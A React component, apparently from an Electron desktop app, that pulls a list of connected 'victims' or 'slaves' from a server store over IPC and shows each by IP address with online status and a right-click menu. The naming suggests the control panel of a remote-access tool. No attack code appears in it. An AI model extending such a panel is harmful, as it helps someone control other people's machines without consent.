import React from "react";
import ContextMenu from "./contextmenu";
import VicBox from "./body/vicBox";

export default class Body extends React.Component{
    constructor(){
        super();
        this.state = {
            ContextMenu: {
                options: {
                    1: [{ text: "hello", icon: "fav", action: this.testing.bind(this) }, { text: "2 hello", icon: "gear", action: this.testing.bind(this)}],
                    2: [{ text: "numm 2", icon: "start", action: null }],
                },
                selected: null,
                renderContext : false,
                clientX: 0,
                clientY: 0
            },
            ServerConstants : null,
            ConnectedGuests : {},
            RenderGuests    : false
        }

    }

    getVictims(){
        ipcRenderer.once("invokedStoreMethod:ServerStore-get-#constants", (e, serverConstant) => {

            let ServerConstants = this.state.ServerConstants;
            ServerConstants = serverConstant;
            
            // update state so we can use it bellow
            this.setState({ServerConstants});

            let cl = (e, slaves) => {

                console.log("slaves:", slaves, "Constants:", ServerConstants);
                let ConnectedGuests = this.state.ConnectedGuests;
                ConnectedGuests = slaves;
                let RenderGuests = this.state.RenderGuests;
                if(RenderGuests === false)
                    RenderGuests = true;

                this.setState({ConnectedGuests, RenderGuests});

            }
            
            // intial data pull
            ipcRenderer.once("invokedStoreMethod:ServerStore-get-#GetConnected", cl);
            ipcRenderer.send("Stores:method",{
                store : "ServerStore",
                method: "get",
                methodParams: [this.state.ServerConstants.connectedVictims],
                id: "GetConnected" 
            });
            
            // data monitor 

            ipcRenderer.on(`invokedEvent:${this.state.ServerConstants.connectedVictims}@UPDATED`, cl);
            ipcRenderer.send("Stores" ,{
                store : "ServerStore",
                type : "on",
                eventName: `${this.state.ServerConstants.connectedVictims}@UPDATED`,
                id: "monitor"
            });

            // Server Constants monitor
            ipcRenderer.on(`invokedEvent:Constants@UPDATED`, (e, con) => this.setState({ ServerConstants: con }) );
            ipcRenderer.send("Stores", {
                store: "ServerStore",
                type: "on",
                eventName: `Constants@UPDATED`,
            });

        });

        ipcRenderer.send("Stores:method", {
            store : "ServerStore",
            method: "get",
            methodParams : ["Constants"],
            id : "constants"
        });
        
    }

    removeContext(e){
        this.setState({
            ContextMenu: {
                renderContext: false,
                clientX: 0,
                clientY: 0,
                options: this.state.ContextMenu.options,
                selected: null
            }
        });
    }
    
    handleContext(e, id){
        let clientX = e.clientX, clientY = e.clientY;
       this.setState({
           ContextMenu: {
               renderContext: !this.state.ContextMenu.renderContext,
               clientX,
               clientY,
               options: this.state.ContextMenu.options,
               selected: id
           }
        });
        const ContextElement = e.target;
        this.ContextElement = ContextElement;
    }

    currentOption(){
        return this.state.ContextMenu.selected == null ? null : this.state.ContextMenu.options[this.state.ContextMenu.selected];
    }

    testing(element){
        alert("clicked");
    }

    componentDidMount(){
        this.getVictims();
    }

    render(){
        let currentOption = this.currentOption();
        let rend = () => {
            let r = [<h3 key="noVics"> No Slaves Was Found :( </h3>];
            if (Object.keys(this.state.ConnectedGuests).length > 0) {
                r.splice(0, 1);
                for (const ip in this.state.ConnectedGuests) {
                    if (this.state.ConnectedGuests[ip].data != null) {
                        if (this.state.ServerConstants.hideOfflineSlaves == true && this.state.ConnectedGuests[ip].status == 0)
                            continue;

                        r.push(<VicBox key={ip}
                            ContextHandler={(event) => this.handleContext(event, 1)}
                            Text={ip} Attributes={{}} info={this.state.ConnectedGuests[ip]} />);

                    }else if(r.length == 0){
                        r.push(
                            <div key="loadingParent">
                                <i className="fa fa-cog fa-spin fa-3x fa-fw" key="loadingIcon" />
                                <span key="loadingText" style={{"fontSize" : "2em"}}> Loading Victim ...</span>
                            </div>
                        );
                    }
                }
            }
            return r;
        }
        return(
            <div className="body" onClick={this.removeContext.bind(this)}>

                {this.state.ContextMenu.renderContext ? 
                <ContextMenu 
                    pos={{ clientX: this.state.ContextMenu.clientX, clientY: this.state.ContextMenu.clientY }} 
                        srcElm={this.ContextElement} options={currentOption} /> : null}

                { 
                    this.state.RenderGuests 
                        ? 
                        rend() 
                        : 
                        <div style={{fontSize : 1.1 + "em"}}>
                            <i className="fa fa-cog fa-spin fa-fw"></i>
                            <span> Loading Configuration ... </span>
                        </div>
                }
                    
            </div>
        )
    }
}